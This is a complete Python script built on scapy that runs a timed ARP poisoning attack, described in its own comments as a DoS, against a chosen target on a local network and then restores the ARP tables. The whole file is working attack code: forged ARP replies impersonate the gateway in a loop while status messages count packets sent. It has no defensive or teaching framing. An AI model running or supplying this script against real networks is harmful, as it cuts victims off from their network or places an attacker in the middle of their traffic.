#!/usr/bin/env python3
import sys
import time
from scapy.all import Ether, ARP, sendp, conf, get_if_hwaddr, srp

# --- CONFIGURATION (Passed as Arguments) ---
# Arguments are retrieved directly from sys.argv
try:
    TARGET_IP = sys.argv[1]
    TARGET_MAC = sys.argv[2]
    GATEWAY_IP = sys.argv[3]
    GATEWAY_MAC = sys.argv[4]
    DURATION = int(sys.argv[5])
    IFACE = sys.argv[6]
except IndexError:
    print("[FATAL] Missing command-line arguments. Did you call the service correctly?")
    sys.exit(1)

# --- DEBUG 1: Parameter Confirmation ---
print("=" * 60)
print("[DEBUG] ARP PATROL SERVICE STARTING")
print(f"[DEBUG] Interface: {IFACE}")
print(f"[DEBUG] Target IP: {TARGET_IP} (MAC: {TARGET_MAC})")
print(f"[DEBUG] Gateway IP: {GATEWAY_IP} (MAC: {GATEWAY_MAC})")
print(f"[DEBUG] Duration: {DURATION} seconds")
print("=" * 60)

# --- RESTORE FUNCTION ---
def restore_arp(target_ip, target_mac, gateway_ip, gateway_mac, iface_id):
    """Sends the correct, unpoisoned ARP replies to restore the target's cache."""
    conf.verb = 0
    print(f"\n[!] CLEANUP: Restoring ARP Tables for {target_ip}.")

    # 1. Restore Target's Cache 
    target_restore = ARP(
        op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=target_ip, hwdst=target_mac
    )

    # 2. Restore Gateway's Cache 
    gateway_restore = ARP(
        op=2, psrc=target_ip, hwsrc=target_mac, pdst=gateway_ip, hwdst=gateway_mac
    )

    # Send the real packets multiple times (DEBUG 3: Verification)
    sendp(Ether(dst=target_mac) / target_restore, iface=iface_id, count=7, verbose=False)
    sendp(Ether(dst=gateway_mac) / gateway_restore, iface=iface_id, count=7, verbose=False)
    print(f"[+] CLEANUP SUCCESS: ARP tables restored for {target_ip}.")

# --- ATTACK FUNCTION (Timed Execution) ---
def spoof_arp_poison_timed(target_ip, target_mac, gateway_ip, gateway_mac, duration, iface_id):
    """
    Executes the poison attack for the specified duration, then cleans up.
    """
    conf.verb = 0
    
    try:
        attacker_mac = get_if_hwaddr(iface_id)
    except:
        print("[FATAL] Could not get attacker MAC. Interface issue. Aborting.")
        return

    # Create the poison packet
    arp_reply = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
    poison_packet = Ether(src=attacker_mac, dst=target_mac) / arp_reply
    
    print(f"[*] ATTACK STARTED: Executing DoS on {target_ip} for {duration} seconds.")
    end_time = time.time() + duration
    
    cycle_count = 0

    # Continuous loop for the DURATION (DEBUG 2: Attack Cycle Status)
    while time.time() < end_time:
        try:
            sendp(poison_packet, iface=iface_id, count=20, verbose=False) 
            cycle_count += 1
            if cycle_count % 10 == 0: # Print status every 10 seconds
                print(f"[*] ATTACK STATUS: Sent {cycle_count * 20} packets. Time remaining: {int(end_time - time.time())}s.")
            time.sleep(0.1) 
        except Exception as e:
            print(f"[!!!] ERROR during attack loop: {e}. Aborting cleanup.")
            break

    # CLEANUP: Crucial step after the duration expires
    restore_arp(target_ip, target_mac, gateway_ip, gateway_mac, iface_id)


# --- MAIN EXECUTION ---
if __name__ == "__main__":
    try:
        # Start the timed attack
        spoof_arp_poison_timed(TARGET_IP, TARGET_MAC, GATEWAY_IP, GATEWAY_MAC, DURATION, IFACE)

    except Exception as e:
        print(f"\n[!!!] FATAL EXECUTION ERROR: {e}")
        sys.exit(1)
